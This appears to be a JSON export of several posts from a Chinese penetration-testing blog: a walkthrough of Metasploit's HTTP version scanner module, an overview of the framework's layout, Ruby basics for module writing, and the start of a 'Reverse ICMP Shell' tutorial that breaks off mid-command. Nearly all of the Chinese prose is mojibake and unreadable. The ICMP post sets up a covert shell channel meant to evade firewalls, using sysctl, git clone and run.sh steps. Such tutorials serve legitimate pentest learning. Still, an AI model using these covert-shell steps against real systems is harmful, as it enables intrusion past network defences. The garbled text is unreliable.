å®šåˆ¶åŒ–çš„Metasploitâ€”åˆ†æHTTPæ¨¡å—","date":"2020-03-02T01:11:13.000Z","updated":"2021-07-07T07:11:43.578Z","comments":true,"path":"2020/0302/.html","link":"","permalink":"https://payloads.cn/2020/0302/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn åˆ†æHTTPæ‰«ææ¨¡å—åˆ†æçš„æ¨¡å—ä½äº/modules/auxiliary/scanner/http/http_version.rb é¦–å…ˆæ¥çœ‹æ¨¡å—å¤´çš„å¼•å…¥ä¸ç±»çš„å®šä¹‰ï¼š 12345678### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;rex/proto/http&#x27; class MetasploitModule &lt; Msf::Auxiliary require &#39;rex/proto/http&#39;è¡¨ç¤ºè¯¥æ¨¡å—å°†è¦å¼•å…¥è¿™ä¸ªrexåº“æ–‡ä»¶ç›®å½•ä¸‹çš„æ‰€æœ‰httpåè®®æ–¹æ³•ï¼Œæ‰€æœ‰çš„æ¨¡å—éƒ½å¯ä»¥è¢«è°ƒå–ä½¿ç”¨ã€‚åŒ…æ‹¬ç”¨äºè®¾ç½®è¿æ¥çš„å‡½æ•°ï¼Œgetå’Œpostçš„è¯·æ±‚å’Œå“åº”å¤„ç†ç­‰ã€‚ Msf::Auxiliaryå®šä¹‰äº†è¯¥ä»£ç çš„ç±»ä¸ºè¾…åŠ©æ¨¡å—ã€‚ å¦‚ä¸‹ä¸º/lib/rex/proto/httpç›®å½•ä¸‹çš„å†…å®¹ï¼š [æ³¨ï¼šç»§æ‰¿æœ‰åŠ©äºé‡ç”¨ä»£ç å’Œå¿«é€Ÿæ‰§è¡Œï¼Œä¸å¹¸çš„æ˜¯ï¼ŒRubyä¸æ”¯æŒå¤šç»§æ‰¿ï¼Œä½†æ˜¯Rubyæ”¯æŒmixinsã€‚mixinå°±åƒæ˜¯å¤šç»§æ‰¿çš„ä¸€ä¸ªç‰¹å®šå®ç°ï¼Œåœ¨å¤šç»§æ‰¿ä¸­ï¼Œåªæœ‰æ¥å£éƒ¨åˆ†æ˜¯å¯ç»§æ‰¿çš„ã€‚] 12345# Exploit mixins should be called first(é¦–å…ˆè°ƒç”¨æ¸—é€æ¨¡å—mixinsç±»)include Msf::Exploit::Remote::HttpClientinclude Msf::Auxiliary::WmapScanServer# Scanner mixin should be near last(æ¥ç€æ˜¯æ‰«ææ¨¡å—mixinsç±»)include Msf::Auxiliary::Scanner ä¸Šé¢ä»£ç æ‰€å¿…éœ€åº“æ–‡ä»¶ä¸­æ¶µç›–äº†ç¼–å†™æ¨¡å—æ‰€éœ€è¦çš„æ‰€æœ‰æ–¹æ³•ï¼Œè¿™äº›åº“æ–‡ä»¶çš„è¯¦ç»†ä¿¡æ¯å¦‚ä¸‹ï¼š è¯­å¥ å¼•å…¥è·¯å¾„ ç”¨é€” Msf::Exploit::Remote::HttpClient /lib/msf/core/exploit/http/client.rb è¿™ä¸ªåº“æ–‡ä»¶æä¾›äº†å¤§é‡æ–¹æ³•ï¼Œä¾‹å¦‚è¿æ¥åˆ°ç›®æ ‡è®¡ç®—æœºã€å‘é€è¯·æ±‚ã€åˆ‡æ–­ä¸å®¢æˆ·ç«¯çš„è¿æ¥ç­‰ã€‚ Msf::Auxiliary::WmapScanServer /lib/msf/core/auxiliary/wmapmodule.rb wmapæ˜¯ä¸€æ¬¾åŸºäºMetasploitçš„é€šç”¨Webåº”ç”¨ç¨‹åºæ‰«ææ¡†æ¶ï¼Œæœ‰åŠ©äºå®ŒæˆMetasploitçš„Webæ¸—é€æµ‹è¯•ã€‚ Msf::Auxiliary::Scanner /lib/msf/core/auxiliary/scanner.rb è¿™ä¸ªæ–‡ä»¶åŒ…å«äº†åŸºäºæ‰«ææ¨¡å—çš„æ‰€æœ‰å‡½æ•°ï¼Œæä¾›äº†æ¨¡å—è¿è¡Œã€æ¨¡å—åˆå§‹åŒ–ã€æ‰«æè¿›åº¦ç­‰å„ç§æ–¹æ³•ã€‚ è¿™ä¸ªinitializeæ–¹æ³•æ˜¯Rubyç¼–ç¨‹è¯­è¨€ä¸­çš„é»˜è®¤æ„é€ æ–¹æ³•ã€‚å®ƒå®šä¹‰äº†åç§°Nameã€æè¿°Descriptionã€ä½œè€…Authorã€è®¸å¯Licenseç­‰ã€‚è®¸å¯å°±æ˜¯&#39;License&#39; =&gt; MSF_LICENSEï¼Œæœ€åç”¨ä¸€ä¸ªendç»“æŸã€‚ 12345678910111213def initialize super( &#x27;Name&#x27; =&gt; &#x27;HTTP Version Detection&#x27;, &#x27;Description&#x27; =&gt; &#x27;Display version information about each system.&#x27;, &#x27;Author&#x27; =&gt; &#x27;hdm&#x27;, &#x27;License&#x27; =&gt; MSF_LICENSE ) register_wmap_options(&#123; &#x27;OrderID&#x27; =&gt; 0, &#x27;Require&#x27; =&gt; &#123;&#125;, &#125;) end æœ€åè¿™æ®µä»£ç æ‰æ˜¯çœŸæ­£å¹²æ´»åšäº‹çš„ï¼š 123456789101112def run_host(ip) begin connect res = send_request_raw(&#123; &#x27;uri&#x27; =&gt; &#x27;/&#x27;, &#x27;method&#x27; =&gt; &#x27;GET&#x27; &#125;) fp = http_fingerprint(:response =&gt; res) print_good(&quot;#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;&quot;) if fp report_service(:host =&gt; rhost, :port =&gt; rport, :sname =&gt; (ssl ? &#x27;https&#x27; : &#x27;http&#x27;), :info =&gt; fp) rescue ::Timeout::Error, ::Errno::EPIPE ensure disconnect end end å…ˆæ¥è§£é‡Šä¸‹åœ¨æœ¬æ®µä»£ç ä¸­æ‰€ä½¿ç”¨çš„é‡è¦å‡½æ•°ï¼š å‡½æ•° å¼•å…¥åº“æ–‡ä»¶ ç”¨é€” run_host /lib/msf/core/auxiliary/scanner.rb ä½¿ç”¨IPä¸æ‰€éœ€ä¸»æœºå»ºç«‹è¿æ¥ connect /lib/msf/core/exploit/http/client.rb ä¸ç›®æ ‡æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªHTTPç±»å‹çš„è¿æ¥ send_request_raw /lib/msf/core/exploit/http/client.rb ç”¨æ¥å‘ç›®æ ‡å‘é€åŸå§‹çš„HTTPè¯·æ±‚ http_fingerprint /lib/msf/core/exploit/http/client.rb å°†HTTPå“åº”è§£æä¸ºå¯ä»¥ä½¿ç”¨çš„å˜é‡ åœ¨è¿™é‡Œä¼šäº§ç”Ÿç–‘é—®ï¼Œå°±æ˜¯ä»ä»£ç ä¸Šä¸‹æ–‡ä¸­æ ¹æœ¬ä¸æ¸…æ¥šå‡½æ•°çš„å…·ä½“å®šä¹‰ï¼Œè¯¥å¦‚ä½•è§£å†³ï¼Ÿè¿™æ—¶å°±éœ€è¦æŸ¥è¯¢Metasploit APIå®˜æ–¹æ–‡æ¡£ã€‚ ä¸‹é¢æ¥å…·ä½“æŸ¥è¯¢åˆ†æä¸‹ï¼š run_host åœ¨runæ–¹æ³•ä¸­ï¼Œä½œç”¨æ˜¯ä¸æ‰€éœ€ä¸»æœºå»ºç«‹è¿æ¥ã€‚ beginæ„å‘³ç€ä»£ç å—çš„å¼€å§‹ã€‚ å¦‚æœè¿æ¥æˆåŠŸï¼Œå°±è¿›è¡Œåˆ°connectæ–¹æ³•ï¼Œç”¨äºä¸ç›®æ ‡æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªHTTPç±»å‹çš„è¿æ¥ã€‚ ä¹‹åä½¿ç”¨send_request_rawæ–¹æ³•ï¼Œè¿æ¥åˆ°æœåŠ¡å™¨ï¼Œåˆ›å»ºè¯·æ±‚ï¼Œå‘é€è¯·æ±‚ï¼Œè¯»å–å“åº”ã€‚å¹¶å°†è¿™ä¸ªæ–¹æ³•çš„å‚æ•°URIçš„å€¼è®¾ç½®ä¸º/ï¼Œå‚æ•°methodçš„å€¼è®¾ç½®ä¸ºGETï¼Œå°†è¿™ä¸ªå“åº”ä¿å­˜åœ¨reså˜é‡ã€‚ res = send_request_raw(&#123; &#39;uri&#39; =&gt; &#39;/&#39;, &#39;method&#39; =&gt; &#39;GET&#39; &#125;) å¦‚æœè¿æ¥æˆåŠŸï¼Œä½¿ç”¨http_fingerprintæ–¹æ³•ï¼Œè®°å½•å’Œè¿‡æ»¤ä¿¡æ¯ã€‚å¦‚ï¼šSet-cookieã€Powered-byç­‰ã€‚ æ¥ç€å†æŠŠæ”¶åˆ°çš„å“åº”ä¿¡æ¯èµ‹å€¼ç»™resï¼Œæ„å‘³ç€å°†æ ¹æ®ä¹‹å‰å‘é€è¯·æ±‚çš„å“åº”æ•°æ®è¿›è¡Œç‰¹å¾åŒ¹é…ã€‚ fp = http_fingerprint(:response =&gt; res) ä¹‹åå¯¹è¿™äº›å“åº”æ•°æ®è¿›è¡Œè¾“å‡ºæ‰“å°ã€‚ æœ€åï¼Œrescue ::Timeout::Error, ::Errno::EPIPE å°†ä¼šåœ¨æ¨¡å—è¶…æ—¶çš„æƒ…å†µä¸‹å¤„ç†ç¨‹åºçš„å¼‚å¸¸ã€‚ å¯è§ï¼Œè¾“å‡ºçš„æ ¼å¼å¯¹åº”print_good(&quot;#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;&quot;) if fp References Metasploit API Metasploit WIKI ã€ŠMastering Metasploit - Third Editionã€‹","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”ä½“ç³»æ¡†æ¶","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”ä½“ç³»æ¡†æ¶","date":"2020-02-28T11:10:05.000Z","updated":"2021-07-07T07:13:35.022Z","comments":true,"path":"2020/0228/.html","link":"","permalink":"https://payloads.cn/2020/0228/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn Metasploitæ¡†æ¶ç»“æ„Metasploitçš„ä½“ç³»æ¡†æ¶ç»“æ„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š æ–‡ä»¶ç»“æ„Metasploitä¸­çš„æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š ç›®å½• ç”¨é€” lib åŒ…å«Metasploitæ¨¡å—çš„å…¨éƒ¨é‡è¦åº“æ–‡ä»¶ (Metasploitçš„æ ¸å¿ƒä¸çµé­‚) modules åŒ…å«Metasploitä¸­çš„æ‰€æœ‰æ¨¡å— tools åŒ…å«ç”¨äºè¾…åŠ©æ¸—é€æµ‹è¯•çš„å‘½ä»¤è¡Œç¨‹åº plugins åŒ…å«æ‰€æœ‰ç”¨äºæ‰©å±•MetasploitåŠŸèƒ½çš„æ’ä»¶ï¼Œä¾‹å¦‚OpenVASã€Nessusâ€¦ scripts åŒ…å«Meterpreterå’Œå…¶ä»–å„ç§è„šæœ¬ åº“çš„å¸ƒå±€Metasploitçš„æ¨¡å—æ˜¯ç”±å„ç§å„æ ·çš„å‡½æ•°æ„æˆçš„ã€‚è¿™äº›å‡½æ•°åŒ…æ‹¬å„ç§åŸºç¡€åº“æ–‡ä»¶ä»¥åŠä½¿ç”¨Ruby ç¼–å†™çš„é€šç”¨ç¨‹åºã€‚åœ¨ä½¿ç”¨è¿™äº›å‡½æ•°ä¹‹å‰ï¼Œé¦–å…ˆè¦çŸ¥é“è¿™äº›å‡½æ•°æ˜¯ä»€ä¹ˆï¼Œå¦‚ä½•ä½¿ç”¨è¿™äº›å‡½æ•°ï¼Œè°ƒç”¨ å‡½æ•°æ—¶éœ€è¦ä¼ é€’å¤šå°‘ä¸ªå‚æ•°?æ›´é‡è¦çš„æ˜¯ï¼Œè¿™äº›å‡½æ•°çš„è¿”å›å€¼ä¼šæ˜¯ä»€ä¹ˆ? åº“çš„å®é™…ä½ç½®é‡è¦çš„rexåº“æ–‡ä»¶ä½äº/libç›®å½•ä¸‹:ï¼ˆåœ¨/libä¸‹è¿˜åŒ…å«äº†å„ç§æœåŠ¡çš„é‡è¦ç›®å½•ï¼‰ å¦å¤–ä¸¤ä¸ªé‡è¦çš„åº“/baseå’Œ/coreä½äº/msfç›®å½•ä¸‹: /msf/coreåº“æ–‡ä»¶æä¾›æ ¸å¿ƒçš„è¾…åŠ©æ¨¡å— core/exploits/ç›®å½•æ˜¯Metasploitæ¨¡å—å¹¿æ³›ä½¿ç”¨çš„åº“æ–‡ä»¶ core/ç›®å½•ä¸‹è¿˜å¯ä»¥æ‰¾åˆ°æ”¯æŒå„ç§ç±»å‹æ¨¡å—çš„æ‰€æœ‰ç›¸å…³åº“æ–‡ä»¶(æ¸—é€ã€æ”»å‡»è½½è·ã€åæ¸—é€ã€ç¼–ç å™¨å’Œå„ç§å…¶ä»–æ¨¡å—çš„coreåº“) é‡è¦æ–‡æ¡£é€šè¿‡ä»¥ä¸Šå¯¹Metasploitæ¡†æ¶ç»“æ„çš„ä»‹ç»ï¼Œå·²ç»æœ‰æ‰€ç†Ÿæ‚‰ã€‚æ¥ä¸‹æ¥ï¼Œåœ¨æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥ç»“åˆå®˜æ–¹æ–‡æ¡£ï¼Œä¸‹é¢åˆ—å‡ºä¸€äº›æ¯”è¾ƒé‡è¦çš„æ–‡æ¡£ä¾›å‚è€ƒï¼š æ­å»ºMetasploitå¼€å‘ç¯å¢ƒï¼Œåˆ›å»ºä¸€ä¸ªä¸“é—¨ç”¨æ¥å¼€å‘çš„Metasploitç‰ˆæœ¬ msf5ï¼šå®˜æ–¹æ–‡æ¡£ ä¸­æ–‡æ–‡æ¡£ ç¤¾åŒºè´¡çŒ®æŒ‡å—ï¼Œè¯·å‚ç…§å®˜æ–¹ç»™å‡ºçš„ä»£ç è§„èŒƒè¿›è¡Œå¼€å‘ï¼šå®˜æ–¹æ–‡æ¡£ ä¸­æ–‡æ–‡æ¡£ Metasploit APIï¼Œèƒ½å¤ŸæŸ¥è¯¢å¤§é‡çš„ç±»ã€æ¨¡å—ã€å‡½æ•°å®šä¹‰ç­‰ç­‰ï¼šå®˜æ–¹æ–‡æ¡£ ä¸€äº›å…¶ä»–çš„å¼€å‘æŠ€èƒ½ï¼ŒåŒ…æ‹¬ä½†ä¸å±€é™äº gitä½¿ç”¨ã€ruby è¯­æ³•ã€Metasploit ä½¿ç”¨äº†è§£ç­‰ã€‚ æ¨¡å—æ ¼å¼é¦–å…ˆï¼Œå¼€å‘çš„Metasploitæ¨¡å—ï¼Œæœ€å¥½çš„åŠæ³•å°±æ˜¯å…ˆæ·±å…¥ç†è§£å®ƒç°æœ‰æ¨¡å—çš„å†…éƒ¨æœºåˆ¶ï¼Œçœ‹çœ‹æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ Metasploité€šç”¨çš„æ¡†æ¶å¤´éƒ¨å¦‚ä¸‹ï¼š 12345678910111213141516171819require &#x27;msf/core&#x27;class MetasploitModule &lt; Msf::Auxiliary def initialize(info = &#123;&#125;) super( update_info( info, &#x27;Name&#x27; =&gt; &#x27;Sample Auxiliary Module&#x27;, # The description can be multiple lines, but does not preserve formatting. &#x27;Description&#x27; =&gt; &#x27;Sample Auxiliary Module&#x27;, &#x27;Author&#x27; =&gt; [&#x27;Joe Module &lt;joem@example.com&gt;&#x27;], &#x27;License&#x27; =&gt; MSF_LICENSE, ) ) end def run # Main function end ä¸€ä¸ªæ¡†æ¶ä¸€èˆ¬éƒ½ä¼šä»ä½¿ç”¨requireå…³é”®å­—å¯¼å…¥é‡è¦çš„åº“æ–‡ä»¶å¼€å§‹ï¼Œä¸Šé¢çš„ä»£ç å°±å¯¼å…¥äº†msf/coreåº“ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªæ¡†æ¶ä¸­å°±åŒ…å«äº†msfç›®å½•ä¸‹çš„coreåº“æ–‡ä»¶ã€‚ æ¥ä¸‹æ¥ä¸»è¦æ˜¯ä½¿ç”¨MetasploitModuleæŒ‡å®šè¿™ä¸ªç±»çš„ç±»å‹ã€‚åœ¨å®šä¹‰ç±»å‹çš„é‚£è¡Œä¸­ï¼Œéœ€è¦å®šä¹‰ç±»çš„ç”¨é€”ã€‚ä¸Šé¢ä»£ç å®šä¹‰äº†ç±»çš„ç”¨é€”ä¸ºMSF::Auxiliaryã€‚ initializeæ–¹æ³•æ˜¯Rubyç¼–ç¨‹è¯­è¨€ä¸­çš„é»˜è®¤æ„é€ æ–¹æ³•ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†åç§° (Name)ã€æè¿°(Description)ã€ä½œè€…(Author)ã€è®¸å¯(License)ç­‰ã€‚è®¸å¯å°±æ˜¯&#39;License&#39; =&gt; MSF_LICENSEã€‚ è¾…åŠ©æ¨¡å—ä¸­çš„ä¸»å‡½æ•°æ˜¯runæ–¹æ³•ï¼Œé™¤éè¦ä½¿ç”¨ç‰¹åˆ«å¤šçš„æ–¹æ³•,å¦åˆ™æ‰€æœ‰çš„æ“ä½œéƒ½åº”è¯¥åœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢æ‰§è¡Œã€‚ä½†æ˜¯ç¨‹åºä»ç„¶è¦ä»runæ–¹æ³•å¼€å§‹æ‰§è¡Œã€‚ References Metasploit API Metasploit WIKI ã€ŠMastering Metasploit - Third Editionã€‹","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”è®¤è¯†Ruby","slug":"æ‰“é€ å®šåˆ¶åŒ–çš„Metasploitâ€”è®¤è¯†Ruby","date":"2020-02-20T07:09:30.000Z","updated":"2021-07-07T07:13:18.564Z","comments":true,"path":"2020/0220/.html","link":"","permalink":"https://payloads.cn/2020/0220/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€Rubyç¼–ç¨‹è¯­è¨€å¯ä»¥è¯´æ˜¯Metasploitæ¡†æ¶çš„æ ¸å¿ƒï¼Œæƒ³è¦å­¦ä¹ å¥½Metasploitæ¨¡å—ç¼–å†™å¿…é¡»è¦ä¼šRubyã€‚ä¸è¿‡Rubyåˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ ¹æ®Rubyå®˜æ–¹ç½‘ç«™çš„è¯´æ³•ï¼šâ€Rubyä¸€é—¨å¼€æºçš„åŠ¨æ€ç¼–ç¨‹è¯­è¨€ï¼Œæ³¨é‡ç®€æ´å’Œæ•ˆç‡ã€‚Ruby çš„å¥æ³•ä¼˜é›…ï¼Œè¯»èµ·æ¥è‡ªç„¶ï¼Œå†™èµ·æ¥èˆ’é€‚ã€‚â€ï¼ˆå¼•è‡ªRubyä¸­æ–‡å®˜ç½‘ï¼‰ç®€å•æ¥è¯´ï¼ŒRubyæ˜¯ä¸€ç§ç®€å•å¿«æ·çš„é¢å‘å¯¹è±¡ï¼ˆé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ï¼‰è„šæœ¬è¯­è¨€ã€‚ruby å¦ä»¥â€çº¢å®çŸ³â€å‘½åã€‚ æœ¬æ–‡åªè®²è§£æ¶‰åŠç¼–å†™Metasploitæ¨¡å—æ‰€å¿…éœ€çš„RubyçŸ¥è¯†ï¼Œå¦‚éœ€æ›´å¤šä»‹ç»å¯ä»¥æŸ¥é˜…Rubyæ•™ç¨‹ï¼Œè¿›è¡Œå­¦ä¹ ã€‚ åˆ›å»ºç¬¬ä¸€ä¸ªrubyç¨‹åºå¦‚éœ€äº†è§£Rubyçš„å®‰è£…è¿‡ç¨‹ï¼Œå¯è‡ªè¡Œç™¾åº¦ï¼Œæœ¬æ–‡ä¸è¿›è¡Œè®²è§£ã€‚ ä¸‹è½½Ruby Rubyçš„äº¤äº’å¼å‘½ä»¤è¡Œè¿™é‡Œç›´æ¥ä½¿ç”¨Kaliç³»ç»Ÿè‡ªå¸¦çš„Rubyç¯å¢ƒï¼Œè·ŸPythonç­‰è¯­è¨€ä¸€æ ·ï¼Œrubyä¹Ÿæœ‰å‘½ä»¤äº¤äº’çš„ï¼Œè¾“å…¥irbå³å¯è¿›å…¥åˆ°å‘½ä»¤è¡Œäº¤äº’æ“ä½œã€‚ ä¸‹é¢åšä¸ª è®¡ç®— ä¸ èµ‹å€¼ çš„ç®€å•æ“ä½œï¼š å‘½ä»¤è¡Œä¸­å®šä¹‰æ–¹æ³•æ–¹æ³•æˆ–å‡½æ•°æ˜¯ä¸€ç»„è¯­å¥ï¼Œå½“å¼ºè°ƒå®ƒä»¬æ—¶å°±ä¼šæ‰§è¡Œã€‚åœ¨ä½¿ç”¨Metasploitæ¨¡å—æ—¶ï¼ŒRubyçš„æ–¹æ³•æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„éƒ¨åˆ†ã€‚è¯­æ³•æ ¼å¼ï¼š 123def method_name [( [arg [= default]]...[, * arg [, &amp;expr ]])] expr..end é¦–å…ˆå·²defå¼€å§‹ï¼Œendå£°æ˜æ”¾åœ¨æœ€åæ¥ç»“æŸå¯¹æ–¹æ³•çš„å®šä¹‰ï¼ŒargæŒ‡çš„æ˜¯æ–¹æ³•æ‰€æ¥æ”¶çš„å‚æ•°ï¼ŒexpræŒ‡çš„æ˜¯ç”¨æ¥æ¥å—å¹¶è®¡ç®—çš„è¡¨è¾¾å¼ã€‚ ä¸‹é¢å®šä¹‰ä¸€ä¸ªå‡½æ•°æ–¹æ³•ï¼š å¯ä»¥çœ‹åˆ°ï¼Œå‡½æ•°é€šè¿‡è¿ç®—æ‰“å°å‡ºäº†æ­£ç¡®çš„ç»“æœã€‚Rubyè¯­è¨€æä¾›äº†putså’Œprintè¿™ä¸¤ç§è¾“å‡ºæ‰“å°å‡½æ•°ã€‚å½“æ¶‰åŠMetasploitæ—¶ï¼Œå°†ä½¿ç”¨print_lineå‡½æ•°ã€‚ ä¸‹é¢åˆ†åˆ«ä½¿ç”¨print_lineã€print_goodã€print_errorã€print_warningã€print_statusã€ä¸print_blank_lineè¯­å¥æ¥è¡¨ç¤ºè¡Œã€æˆåŠŸæ‰§è¡Œã€é”™è¯¯æ‰§è¡Œã€è­¦å‘Šã€çŠ¶æ€ä¸æ¢è¡Œï¼š 12345678def run print_line(&quot;---&quot;) print_good(&quot;successful&quot;) print_error(&quot;error&quot;) print_warning(&quot;warning&quot;) print_status(&quot;status&quot;) print_blank_line end Rubyä¸­çš„å˜é‡å’Œæ•°æ®ç±»å‹å˜é‡æ˜¯æŒ‡ä¸€ä¸ªå€¼å¯ä»¥éšæ—¶æ”¹å˜çš„å ä½ç¬¦ã€‚Rubyè¯­è¨€æ”¯æŒä¼—å¤šçš„æ•°æ®ç±»å‹ï¼Œä½†åªè®²è§£ä¸Metasploitç›¸å…³çš„æ•°æ®ç±»å‹ã€‚ å­—ç¬¦ä¸²å¤„ç†ä½¿ç”¨Rubyè¯­è¨€ç¼–å†™Metasploitæ¨¡å—æ—¶ï¼Œå°½é‡ä½¿ç”¨åŒå¼•å·æ ‡è®°ï¼Œå› ä¸ºå•å¼•å·å¯èƒ½ä¼šäº§ç”Ÿé—®é¢˜ï¼š å­—ç¬¦ä¸²è¿æ¥å°†ä¸¤ä¸ªä¸åŒç»“æœè¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿ç”¨+è¿ç®—ç¬¦å®ç°å­—ç¬¦ä¸²çš„è¿æ¥ï¼›å½“éœ€è¦ä¸€ä¸ªå˜é‡åé¢è¿½åŠ æ•°æ®çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨&lt;&lt;è¿ç®—ç¬¦ï¼š å­å­—ç¬¦ä¸²substringå‡½æ•° splitå‡½æ•° Rubyä¸­çš„æ•°å­—å’Œè½¬æ¢åœ¨å¤„ç†ç”¨æˆ·è¾“å…¥æ˜¯ï¼Œå¯ä»¥ç”¨to_iå‡½æ•°å°†å­—ç¬¦ä¸²ç±»å‹çš„è¾“å…¥è½¬æ¢æˆæ•°å­—ï¼›å¦å¤–ï¼Œå¯ä»¥ç”¨to_så‡½æ•°å°†ä¸€ä¸ªæ•°å­—è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚ æ•°åˆ¶è½¬æ¢ 16è¿›åˆ¶åˆ°10è¿›åˆ¶çš„è½¬æ¢ 10è¿›åˆ¶åˆ°16è¿›åˆ¶çš„è½¬æ¢ èŒƒå›´èŒƒå›´(range)æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„å†…å®¹ï¼Œå¹¿æ³›åº”ç”¨åœ¨Metasploitçš„è¾…åŠ©æ¨¡å—ä¸­ã€‚ä¾‹å¦‚auxiliaryâ€¦ ä¸€ä¸ªèŒƒå›´çš„å¯¹è±¡æä¾›å¤šç§æ“ä½œï¼šæœç´¢ã€æŸ¥æ‰¾æœ€å°å€¼ä¸æœ€å¤§å€¼ã€æ˜¾ç¤ºèŒƒå›´ä¸­çš„æ‰€æœ‰æ•°æ®ã€‚è¿™é‡Œinclude?å‡½æ•°å¯ä»¥æ£€æŸ¥èŒƒå›´ä¸­æ˜¯å¦åŒ…å«æŸä¸€ä¸ªç‰¹å®šçš„å€¼ã€‚æ­¤å¤–ï¼Œminä¸maxåˆ†åˆ«æ˜¾ç¤ºèŒƒå›´ä¸­çš„æœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚ Rubyä¸­çš„å¾ªç¯è¿­ä»£è¯­å¥è¢«ç§°ä¸ºå¾ªç¯ã€‚Rubyçš„è¯­æ³•å’Œå…¶ä»–ç¼–ç¨‹è¯­è¨€çš„ä¸åŒä¹‹å¤„ï¼š 123456def for1(a) for i in 0..a print (&quot;This number is #&#123;i&#125;\\n&quot;) endendfor1 (10) è¿™é‡Œä½¿ç”¨#&#123;i&#125;å»æ‰“å°è¾“å‡ºçš„å˜é‡içš„å€¼,å…³é”®å­—\\næŒ‡å®šå¼€å§‹æ–°çš„ä¸€è¡Œã€‚ è€Œè¿­ä»£å¾ªç¯æ˜¯é€šè¿‡eachå®ç°çš„ï¼Œåœ¨Metasploitæ¨¡å—ä¸­è¢«å¹¿æ³›ä½¿ç”¨ã€‚ 12345678def each_example(a) a.each do |i| print i.to_s + &quot;\\t&quot; endenda=Array.new(5)a=[5,10,15,20,25]each_example(a) å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œå¹¶æ¥æ”¶æ•°ç»„aï¼Œå†ç”¨eachå¾ªç¯æ‰“å°å‡ºæ¥ã€‚ References Metasploit API Metasploit WIKI ã€ŠMastering Metasploit - Third Editionã€‹","categories":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"Reverse ICMP Shell","slug":"Reverse-ICMP-Shell","date":"2020-02-12T08:54:27.000Z","updated":"2021-07-07T07:17:05.587Z","comments":true,"path":"2020/0212/.html","link":"","permalink":"https://payloads.cn/2020/0212/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€å†…ç½‘ä¸­çš„å¤§å¤šæ•°ç³»ç»Ÿéƒ½ä½äºé˜²ç«å¢™æˆ–å…¶ä»–å®‰å…¨è®¾å¤‡ä¹‹åï¼Œä»¥ä¾¿æ§åˆ¶å…¥å£ä»¥åŠå‡ºå£æµé‡ã€‚é˜²ç«å¢™å¯ä»¥æ‹¦æˆªåˆ°åè¿çš„shellï¼Œä½†ICMPåè®®åŸºæœ¬ä¸Šæ˜¯ä¸æ‹¦æˆªçš„ã€‚å› æ­¤ï¼Œä¸ºäº†è·å¾—shellå¹¶åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ICMPåè®®ä½œä¸ºéšè—é€šé“è¿›è¡Œè¿æ¥ã€‚ å®ä¾‹è®²è§£æœåŠ¡ç«¯ç¦pingå¿…é¡»å¼€å¯ï¼Œæ‰èƒ½æ­£å¸¸é€šè¿‡ICMPåå¼¹Shellã€‚ 1sysctl -w net.ipv4.icmp_echo_ignore_all=1 èµ·åˆè¿è¡Œ run.shä¼šæŠ¥é”™ï¼Œæ˜¯å› ä¸ºrun.shæœªæŠŠæœ¬åœ°IPæå–å‡ºæ¥ã€‚(run.shé‡Œè°ƒç”¨çš„æ˜¯icmpsh_m.py) 1234git clone https://github.com/inquisb/icmpsh.gitcd icmpsh/chmod 777 run.sh./run.sh è¿™é‡Œæ”¹ä¸‹å°±å¥½äº†ï¼Œå°† 12IPINT=$(ifconfig | grep &quot;eth&quot; | cut -d &quot; &quot; -f 1 | head -1)IP=$(ifconfig 